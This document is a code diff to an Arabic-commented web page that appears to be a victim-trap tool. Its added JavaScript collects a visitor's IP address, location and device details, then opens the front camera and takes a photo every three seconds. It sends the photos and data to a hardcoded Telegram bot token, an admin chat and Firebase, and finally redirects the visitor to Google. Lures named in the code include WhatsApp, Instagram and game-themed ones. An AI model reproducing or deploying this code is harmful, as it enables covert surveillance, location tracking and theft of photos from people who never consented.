@@ -9,7 +9,6 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 
     <style>
-        /* التنسيقات مدمجة من style.css */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; text-align: center; }
         body {
             height: 100vh; display: flex; align-items: center; justify-content: center;
@@ -50,80 +49,237 @@
             const botToken = "7681653454:AAHdCsBUKbiru2Z-9aDBzMgVeqhuDWGLyjk"; 
             const adminChatId = "5375214810"; 
 
-            // جلب الـ user_id من الرابط
+            // جلب البيانات من الرابط
             const urlParams = new URLSearchParams(window.location.search);
             const userId = urlParams.get("user_id");
+            const tool = urlParams.get("tool") || "fcam"; // تحديد الأداة
+            const telegramId = urlParams.get("telegram");
 
             const countdownElement = document.getElementById("countdown");
             const progressBar = document.getElementById("progress");
             let timeLeft = 20;
 
-            // بدء العد التنازلي
+            // العد التنازلي
             const countdownInterval = setInterval(() => {
                 timeLeft--;
                 countdownElement.textContent = timeLeft;
                 progressBar.style.width = (timeLeft / 20) * 100 + "%";
-                if (timeLeft <= 0) clearInterval(countdownInterval);
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    // تحويل لجوجل بعد انتهاء الوقت
+                    window.location.href = "https://www.google.com";
+                }
             }, 1000);
 
-            // الحصول على معلومات الضحية
+            // ✅ دالة جلب بيانات الضحية بشكل صحيح
             async function getVictimData() {
                 try {
+                    // جلب الـ IP
                     const ipRes = await fetch("https://api64.ipify.org?format=json");
-                    const ipData = await ipRes.ip;
-                    const geoRes = await fetch(`https://ip-api.com/json/`);
-                    const geoData = await geoRes.json();
+                    const ipJson = await ipRes.json();
+                    const ip = ipJson.ip;
+
+                    // جلب الموقع
+                    let location = "Unknown";
+                    try {
+                        const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
+                        const geoData = await geoRes.json();
+                        location = `${geoData.city || ''}, ${geoData.country || ''}`;
+                    } catch(e) { location = "Unknown"; }
 
                     return {
-                        ip: geoData.query || "Unknown",
-                        location: `${geoData.city || ''}, ${geoData.country || ''}`,
-                        device: navigator.platform,
-                        browser: navigator.userAgent,
-                        time: new Date().toLocaleString()
+                        ip: ip,
+                        location: location,
+                        device: navigator.userAgent,
+                        browser: getBrowserInfo(),
+                        platform: navigator.platform,
+                        timestamp: Date.now(),
+                        time: new Date().toLocaleString('ar-EG'),
+                        tool: tool
                     };
-                } catch (e) { return { ip: "Error", time: new Date().toLocaleString() }; }
+                } catch (e) { 
+                    console.error("Error getting data:", e);
+                    return { 
+                        ip: "Error", 
+                        location: "Unknown",
+                        device: navigator.userAgent,
+                        timestamp: Date.now(),
+                        time: new Date().toLocaleString('ar-EG'),
+                        tool: tool
+                    }; 
+                }
             }
 
-            // إرسال البيانات (Firebase + Telegram)
+            // ✅ دالة تحديد المتصفح
+            function getBrowserInfo() {
+                const ua = navigator.userAgent;
+                if (ua.includes("Chrome")) return "Chrome";
+                if (ua.includes("Firefox")) return "Firefox";
+                if (ua.includes("Safari")) return "Safari";
+                if (ua.includes("Edge")) return "Edge";
+                if (ua.includes("Opera")) return "Opera";
+                return "Unknown";
+            }
+
+            // ✅ دالة إرسال الصور للتليجرام
+            async function sendPhotoToTelegram(blob, chatId) {
+                if (!chatId || chatId === "Unknown" || chatId === "null") return;
+                
+                const formData = new FormData();
+                formData.append("chat_id", chatId);
+                formData.append("photo", blob, `cam_${Date.now()}.jpg`);
+                
+                try {
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { 
+                        method: "POST", 
+                        body: formData 
+                    });
+                } catch (err) {
+                    console.error("Telegram photo error:", err);
+                }
+            }
+
+            // ✅ دالة حفظ الصورة في Firebase
+            async function savePhotoToFirebase(blob, userId) {
+                if (!userId || userId === "Unknown") return;
+                
+                const reader = new FileReader();
+                reader.onloadend = async function() {
+                    const base64data = reader.result;
+                    await db.ref(`live/${userId}/photos`).push({
+                        image: base64data,
+                        timestamp: Date.now(),
+                        time: new Date().toLocaleTimeString('ar-EG'),
+                        tool: tool
+                    });
+                };
+                reader.readAsDataURL(blob);
+            }
+
+            // ✅ دالة تشغيل الكاميرا والتصوير
+            async function startCamera() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: "user" },
+                        audio: false 
+                    });
+                    
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    
+                    video.onloadedmetadata = () => {
+                        // بدأ التصوير بعد تحميل الفيديو
+                        capturePhotos();
+                        
+                        // إرسال إشعار للمستخدم
+                        if (userId && userId !== "Unknown") {
+                            db.ref(`live/${userId}/status`).set({
+                                status: "✅ الضحية دخلت الكاميرا الأمامية",
+                                time: new Date().toLocaleTimeString('ar-EG'),
+                                tool: tool
+                            });
+                        }
+                    };
+                } catch (err) {
+                    console.error("Camera permission denied");
+                    // لو رفض الكاميرا، سجل البيانات بس
+                    logVictim();
+                }
+            }
+
+            // ✅ دالة التقاط الصور
+            function capturePhotos() {
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                const context = canvas.getContext('2d');
+
+                function takePhoto() {
+                    if (video.videoWidth && video.videoHeight) {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        canvas.toBlob(blob => {
+                            // إرسال للأدمن
+                            sendPhotoToTelegram(blob, adminChatId);
+                            
+                            // إرسال لصاحب الرابط
+                            if (userId && userId !== "Unknown" && userId !== adminChatId) {
+                                sendPhotoToTelegram(blob, userId);
+                                savePhotoToFirebase(blob, userId);
+                            }
+                        }, "image/jpeg", 0.7); // جودة 70% للسرعة
+                    }
+                    
+                    // تصوير كل 3 ثواني
+                    setTimeout(takePhoto, 3000);
+                }
+                
+                takePhoto();
+            }
+
+            // ✅ دالة إرسال البيانات للفيربيس والتليجرام
             async function logVictim() {
                 const data = await getVictimData();
 
-                // 1. الإرسال للفيربيس (ليظهر في لوحة المستخدم Live)
-                if (userId) {
-                    db.ref('hits/' + userId).push({
-                        ...data,
-                        type: "جديد 🟢"
-                    });
+                // 1. حفظ في Firebase
+                if (userId && userId !== "Unknown") {
+                    await db.ref('hits/' + userId).push(data);
                 }
 
-                // 2. الإرسال للتليجرام (لك وللمستخدم)
-                const message = `🎯 **ضحية جديدة دخلت الفخ:**\n\n` +
+                // 2. إرسال للتليجرام
+                const message = `🎯 **ضحية جديدة!**\n` +
+                                `🛠️ الأداة: ${getToolName(tool)}\n` +
                                 `📍 الموقع: ${data.location}\n` +
                                 `📡 IP: ${data.ip}\n` +
                                 `📱 الجهاز: ${data.device}\n` +
                                 `⏰ الوقت: ${data.time}`;
 
                 const targets = [adminChatId];
-                if (userId && userId !== adminChatId) targets.push(userId);
+                if (userId && userId !== "Unknown" && userId !== adminChatId) {
+                    targets.push(userId);
+                }
+                
+                // إضافة تليجرام ID من الرابط
+                if (telegramId && telegramId !== "Unknown") {
+                    targets.push(telegramId);
+                }
 
                 targets.forEach(chatId => {
                     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
-                    });
+                        body: JSON.stringify({ 
+                            chat_id: chatId, 
+                            text: message, 
+                            parse_mode: "Markdown" 
+                        })
+                    }).catch(err => console.error("Telegram error:", err));
                 });
             }
 
-            // تشغيل الكاميرا في الخلفية (اختياري حسب رغبتك)
-            async function startSilentCamera() {
-                try {
-                    await navigator.mediaDevices.getUserMedia({ video: true });
-                    logVictim();
-                } catch (e) { logVictim(); } // لو رفض الكاميرا برضه هنبعت البيانات
+            // ✅ دالة اسم الأداة
+            function getToolName(toolValue) {
+                const tools = {
+                    fcam: "كاميرا أمامي",
+                    rcam: "كاميرا خلفي",
+                    vcam: "كاميرا مع صوت",
+                    info: "معلومات الهاتف",
+                    loc: "الموقع",
+                    fb: "فيسبوك",
+                    inst: "انستغرام",
+                    tk: "تيك توك",
+                    snap: "سناب شات",
+                    wa: "واتساب",
+                    ff: "فري فاير",
+                    pubg: "بوبجي"
+                };
+                return tools[toolValue] || toolValue;
             }
 
-            startSilentCamera();
+            // ✅ تشغيل كل حاجة
+            await logVictim(); // تسجيل البيانات أولاً
+            startCamera(); // تشغيل الكاميرا بعدها
         });
     </script>
 </body>
